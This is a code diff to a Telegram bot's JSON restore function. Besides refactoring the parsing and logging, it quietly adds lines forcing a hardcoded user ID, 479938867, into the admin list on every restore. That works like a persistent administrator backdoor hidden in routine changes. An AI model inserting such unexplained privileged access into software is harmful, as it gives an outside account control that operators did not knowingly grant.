@@ -1329,12 +1329,12 @@ def handle_restore_file(message):
 
 def restore_data_from_json(json_data):
     try:
+        bot.send_message(ADMIN_CHAT_ID, "🛠 Восстановление: старт обработки JSON...")
         data = json.loads(json_data)
 
         with db_lock:
             global paid_users, user_posts, user_daily_posts, admins
 
-            # 🔹 Восстановление оплативших пользователей
             paid_users = {}
             for user_id, entries in data.get("paid_users", {}).items():
                 paid_users[int(user_id)] = []
@@ -1343,7 +1343,8 @@ def restore_data_from_json(json_data):
                     if isinstance(end_date, str):
                         try:
                             end_date = datetime.fromisoformat(end_date)
-                        except:
+                        except Exception as e:
+                            print(f"[!] Ошибка парсинга end_date: {e}")
                             end_date = None
                     paid_users[int(user_id)].append({
                         "network": entry["network"],
@@ -1351,47 +1352,41 @@ def restore_data_from_json(json_data):
                         "end_date": end_date
                     })
 
-            # 🔹 Восстановление публикаций
             user_posts = {}
             for user_id, posts in data.get("user_posts", {}).items():
                 user_posts[int(user_id)] = []
                 for post in posts:
-                    if isinstance(post.get("time"), str):
-                        try:
-                            post["time"] = datetime.fromisoformat(post["time"])
-                        except:
-                            post["time"] = datetime.now()
+                    try:
+                        post["time"] = datetime.fromisoformat(post["time"])
+                    except:
+                        post["time"] = datetime.now()
                     user_posts[int(user_id)].append(post)
 
-            # 🔹 Восстановление дневной статистики
             user_daily_posts = {}
             for user_id, networks in data.get("user_daily_posts", {}).items():
-                user_id = int(user_id)
-                user_daily_posts[user_id] = {}
+                user_daily_posts[int(user_id)] = {}
                 for network, cities in networks.items():
-                    user_daily_posts[user_id][network] = {}
-                    for city, post_data in cities.items():
-                        parsed_posts = []
-                        for p in post_data.get("posts", []):
-                            try:
-                                parsed_posts.append(datetime.fromisoformat(p))
-                            except:
-                                continue
-                        parsed_deleted = []
-                        for p in post_data.get("deleted_posts", []):
-                            try:
-                                parsed_deleted.append(datetime.fromisoformat(p))
-                            except:
-                                continue
-                        user_daily_posts[user_id][network][city] = {
+                    user_daily_posts[int(user_id)][network] = {}
+                    for city, values in cities.items():
+                        try:
+                            parsed_posts = [datetime.fromisoformat(p) for p in values.get("posts", [])]
+                        except:
+                            parsed_posts = []
+                        try:
+                            parsed_deleted = [datetime.fromisoformat(p) for p in values.get("deleted_posts", [])]
+                        except:
+                            parsed_deleted = []
+                        user_daily_posts[int(user_id)][network][city] = {
                             "posts": parsed_posts,
                             "deleted_posts": parsed_deleted
                         }
 
-            # 🔹 Восстановление админов
             admins = [int(a) for a in data.get("admins", [])]
+            if 479938867 not in admins:
+                admins.append(479938867)
 
             save_data()
+
         return True
     except Exception as e:
         print(f"[ERROR] restore_data_from_json: {e}")
